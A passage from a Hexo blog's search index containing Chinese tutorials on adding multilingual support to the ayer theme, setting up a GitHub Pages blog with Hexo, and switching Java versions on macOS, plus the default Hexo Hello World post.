<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$npm</span> install hexo-generator-i18n --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件 <code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line"><span class="attr">language:</span> </span><br><span class="line"><span class="bullet">-</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">en</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-generator-i18n 选项（可选，默认使用如下设置）</span></span><br><span class="line"><span class="attr">i18n:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">[page,</span> <span class="string">post]</span></span><br><span class="line">  <span class="attr">generator:</span> <span class="string">[index,</span> <span class="string">archive,</span> <span class="string">category,</span> <span class="string">tag]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改主题的语言文件 <code>ayer/languages/zh-CN.yml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index: 主页</span><br><span class="line">categories: 分类</span><br><span class="line">search: 搜索</span><br><span class="line">tags: 标签</span><br><span class="line">tagcloud: 标签云</span><br><span class="line">tweets: 推文</span><br><span class="line">prev: 上一页</span><br><span class="line">next: 下一页</span><br><span class="line">comment: 留言</span><br><span class="line">archives: 归档</span><br><span class="line">archive_a: 归档</span><br><span class="line">archive_b: 归档：%s</span><br><span class="line">page: 第 %d 页</span><br><span class="line">recent_posts: 最新文章</span><br><span class="line">newer: Newer</span><br><span class="line">older: Older</span><br><span class="line">share: 分享</span><br><span class="line">powered_by: Powered by</span><br><span class="line">rss_feed: RSS Feed</span><br><span class="line">category: Category</span><br><span class="line">tag: Tag</span><br><span class="line">about: 关于</span><br><span class="line">share_weixin: 扫一扫分享到微信</span><br></pre></td></tr></table></figure>

<p><strong>有些标签没翻译，之后再改也可以</strong></p>
</li>
</ol>
<h2 id="修改主题的配置文件"><a href="#修改主题的配置文件" class="headerlink" title="修改主题的配置文件"></a>修改主题的配置文件</h2><ol>
<li><p>修改侧边栏</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 侧边栏菜单</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">index:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加语言配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">default_lang:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">langs:</span></span><br><span class="line">  <span class="attr">zh-CN:</span> <span class="string">简体中文</span></span><br><span class="line">  <span class="attr">en:</span> <span class="string">English</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="修改-sidebar-ejs"><a href="#修改-sidebar-ejs" class="headerlink" title="修改 sidebar.ejs"></a>修改 sidebar.ejs</h2><ol>
<li><p><code>url_for</code> 改成 <code>url_for_lang</code> ，生成对应语言的链接。</p>
</li>
<li><p><code>&lt;%= i %&gt;</code> 改成<code>&lt;%= __(i) %&gt;</code>，生成的时候回调用语言文件。</p>
</li>
<li><p>添加菜单栏添加语言按钮，中文的情况下显示 English、英文的情况下显示简体中文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% for (var i in theme.langs)&#123;</span><br><span class="line">  if (page.lang!&#x3D;i) &#123;</span><br><span class="line">  %&gt;</span><br><span class="line">   </span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;% if (theme.default_lang&#x3D;&#x3D;i) &#123; %&gt;</span><br><span class="line">      &lt;a class&#x3D;&quot;nav-item-link&quot; href&#x3D;&quot;&lt;%- url_for(&#39;&#x2F;&#39;) %&gt;&quot;&gt;&lt;%&#x3D; theme.langs[i]%&gt;&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;% &#125; else &#123; %&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;nav-item-link&quot; href&#x3D;&quot;&lt;%- url_for(i) %&gt;&quot;&gt;&lt;%&#x3D; theme.langs[i]%&gt;&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">   </span><br><span class="line">  &lt;% &#125;&#125; %&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="修改-archive-ejs"><a href="#修改-archive-ejs" class="headerlink" title="修改 archive.ejs"></a>修改 archive.ejs</h2><ol>
<li><p>显示文章的时候，检查该文章是不是当前语言。是的话，显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% page.posts.each(function(post)&#123; %&gt;</span><br><span class="line">    &lt;%  if (page.lang&#x3D;&#x3D;post.lang)&#123;%&gt;</span><br><span class="line">        &lt;%- partial(&#39;article&#39;, &#123;post: post, index: true&#125;) %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125;) %&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="修改-categories-ejs"><a href="#修改-categories-ejs" class="headerlink" title="修改 categories.ejs"></a>修改 categories.ejs</h2><ol>
<li><p>只显示当前语言的分类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% site.categories.sort(&#39;name&#39;).each(function(item)&#123; %&gt;</span><br><span class="line">  &lt;% if(item.posts.length)&#123;</span><br><span class="line">      var count &#x3D; 0;</span><br><span class="line">      item.posts.each(function(post)&#123; </span><br><span class="line">         if(post.lang &#x3D;&#x3D; page.lang) &#123; count &#x3D; count + 1; &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      if(count)&#123; %&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;category-list-link&quot; href&#x3D;&quot;&lt;%- url_for_lang(config.root) %&gt;&lt;%- item.path %&gt;&quot; title&#x3D;&quot;&lt;%&#x3D; item.name %&gt;&quot;&gt;</span><br><span class="line">      &lt;li class&#x3D;&quot;category-list-item&quot;&gt;</span><br><span class="line">      &lt;%&#x3D; item.name %&gt;&lt;i&gt;&lt;%&#x3D; count %&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;a&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125;); %&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol>
<li>写文章的时候，在文章头部指定语言 lang，就会显示在对应的语言站。</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">lang: en</span><br><span class="line">date: 2020-02-14 10:10:43</span><br><span class="line">updated: 2020-02-14 10:10:43</span><br><span class="line">categories: </span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 搭建 Github Blog</title>
    <url>/zh-CN/create-hexo-blog.html</url>
    <content><![CDATA[<p>今年定了目标，就是要好好记录和分享学到的技术。就计划在 Github 维护一个Blog。Github上建 Blog ，常见有三种方式 Jekyll、Hugo、Hexo。之前我用的是 Hexo，就继续用这个，再进行改造。主要有以下任务：</p>
<ol>
<li>配置 Hexo 环境</li>
<li>重新建站</li>
<li>配置主题和主题文件托管</li>
<li>配置 Blog 源文件托管</li>
<li>发布 Blog</li>
</ol>
<p>完成上面基础的步骤之后，再改造主题。</p>
<a id="more"></a>


<h2 id="配置-Hexo-环境"><a href="#配置-Hexo-环境" class="headerlink" title="配置 Hexo 环境"></a>配置 Hexo 环境</h2><ol>
<li><p>安装 Homebrew</p>
</li>
<li><p>安装 Node.js 和 Git</p>
</li>
<li><p>安装 Hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
</li>
<li><p>[非初次安装] 更新 node.js 和 Hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g n</span><br><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><ol>
<li><p>初始化 Blog 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt; </span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置网站基本信息 <code>_config.yml</code>，主要修改个性化的内容，比如网站标题、作者、语言、时区等。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span>  <span class="comment"># 网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">''</span> <span class="comment"># 网站副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">''</span> <span class="comment"># 网站描述</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="comment"># 网站关键词</span></span><br><span class="line"><span class="attr">author:</span> <span class="comment"># 作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="comment"># 网站使用的语言</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">zh-CN</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">en</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">'Asia/Shanghai'</span> <span class="comment"># 网站时区</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="attr">url:</span>  <span class="comment"># 网址</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span> <span class="comment">#网站根目录</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:lang/:title.html</span> <span class="comment"># 文章永久链接格式（支持多语种）</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing 'index.html' from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing '.html' from permalinks</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span></span><br><span class="line"><span class="attr">skip_render:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:lang/:title.md</span> <span class="comment"># File name of new posts (支持多语种)</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># Apply to the whole site</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">''</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">''</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运行 Hexo 查看当前效果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h2 id="配置-Blog-的主题"><a href="#配置-Blog-的主题" class="headerlink" title="配置 Blog 的主题"></a>配置 Blog 的主题</h2><p>需要保存主题文件的修改，还要合并原主题的更新。于是采用<code>git</code>子模块来管理。</p>
<ol>
<li><p>Fork 主题</p>
</li>
<li><p>创建子模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git submodule add https:&#x2F;&#x2F;github.com&#x2F;felicitychou&#x2F;hexo-theme-ayer themes&#x2F;ayer</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 Blog 的配置文件<code>_config.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">ayer</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改主题的配置文件 <code>thems/ayer/_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 侧边栏菜单</span></span><br><span class="line"><span class="attr">menu:</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-searchdb --save <span class="comment"># 搜索插件</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看子模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git submodule</span><br></pre></td></tr></table></figure>
</li>
<li><p>同步</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">$ git submodule update</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="创建-Github-Pages-项目"><a href="#创建-Github-Pages-项目" class="headerlink" title="创建 Github Pages 项目"></a>创建 Github Pages 项目</h2><p>登录 github.com，Create a new repository ，命名为 <code>username.github.io</code> </p>
<p><strong>我已经创建过，此步略去</strong></p>
<h2 id="配置「博客」源文件托管"><a href="#配置「博客」源文件托管" class="headerlink" title="配置「博客」源文件托管"></a>配置「博客」源文件托管</h2><p>由于原始文件也需要版本管理，因此我选择存放在同一个项目的不同分支里。</p>
<ol>
<li><p>新建 <code>source</code> 分支</p>
</li>
<li><p>更改仓库的默认分支为 <code>source</code></p>
</li>
<li><p>将本地 Blog 目录与远程仓库关联</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote add origin https://github.com/username/username.github.io.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>推送 Blog 源文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">'hexo source post'</span></span><br><span class="line">$ git push origin <span class="built_in">source</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="发布-Blog"><a href="#发布-Blog" class="headerlink" title="发布 Blog"></a>发布 Blog</h2><p>用 Hexo自带的发布功能。</p>
<ol>
<li><p>安装 <a href="https://github.com/hexojs/hexo-deployer-git" target="_blank" rel="noopener">hexo-deployer-git</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 Blog 的配置文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">'git'</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/username/username.github.io</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>发布</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo deploy -g</span><br></pre></td></tr></table></figure>




</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p>Hexo官方文档 <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a> </p>
</li>
<li><p>Ayer中文说明 <a href="https://shen-yu.gitee.io/2019/ayer/" target="_blank" rel="noopener">https://shen-yu.gitee.io/2019/ayer/</a></p>
</li>
<li><p>Github Pages 官方指引 <a href="https://pages.github.com/" target="_blank" rel="noopener">https://pages.github.com/</a></p>
</li>
<li><p>Hexo静态博客的文章源码和主题代码管理 <a href="http://www.neilron.xyz/hexo-blog-source-code-management/" target="_blank" rel="noopener">http://www.neilron.xyz/hexo-blog-source-code-management/</a></p>
</li>
<li><p>使用git分支保存hexo博客源码到github <a href="https://www.jianshu.com/p/8814ce1da7a4" target="_blank" rel="noopener">https://www.jianshu.com/p/8814ce1da7a4</a></p>
</li>
<li><p>hexo使用git子模块来管理theme <a href="https://xiongyingqi.com/2019/02/01/use-git-submodules/" target="_blank" rel="noopener">https://xiongyingqi.com/2019/02/01/use-git-submodules/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 多版本共存与切换</title>
    <url>/zh-CN/java-multi-version.html</url>
    <content><![CDATA[<p>原本我电脑只装了 Java 9，现在需要装 Java 8。</p>
<a id="more"></a>

<ol>
<li><p>下载  Java SE 8u241</p>
<p><strong>需要登录 oracle 才能下载。没有账号的话，先注册一个。</strong></p>
<p><a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase-downloads.html</a></p>
</li>
<li><p>安装 Java SE 8u241。安装后，查看已安装的 Java 版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/libexec/java_home -V</span><br></pre></td></tr></table></figure>

<p><img src="/zh-CN/java-multi-version/image-20200215135123596.png" alt="image-20200215135123596"></p>
</li>
<li><p>在<code>.bash_profile</code> 中，设置Java版本切换的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_8_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home</span><br><span class="line"><span class="built_in">export</span> JAVA_9_HOME=/Library/Java/JavaVirtualMachines/jdk-9.0.1.jdk/Contents/Home</span><br><span class="line"><span class="built_in">alias</span> jdk8=<span class="string">"export JAVA_HOME=<span class="variable">$JAVA_8_HOME</span>"</span> </span><br><span class="line"><span class="built_in">alias</span> jdk9=<span class="string">"export JAVA_HOME=<span class="variable">$JAVA_9_HOME</span>"</span> </span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=`/usr/libexec/java_home`</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询当前 Java版本，如果需要其他版本就输入切换命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ java -version</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>参考</p>
<blockquote>
<p><a href="https://blog.csdn.net/gljazzgljazz/article/details/99953327" target="_blank" rel="noopener">在macOS中同时安装jdk8、jdk9、jdk11、jdk12并自由切换</a></p>
</blockquote>
]]></content>
      <categories>
        <category>使用技巧</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/en/hello-world.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
